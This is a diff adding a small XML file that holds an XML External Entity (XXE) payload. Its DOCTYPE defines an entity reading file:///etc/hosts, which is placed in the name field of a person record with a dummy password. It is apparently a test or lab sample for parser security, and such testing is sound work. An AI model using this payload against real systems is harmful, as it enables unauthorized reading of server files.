@@ -1,0 +1,7 @@
+<!DOCTYPE creds [<!ENTITY toreplace SYSTEM 'file:///etc/hosts'> ]>
+
+<person>
+    <name>&toreplace;</name>
+    <age>21</age>
+    <pass>123</pass>
+</person>
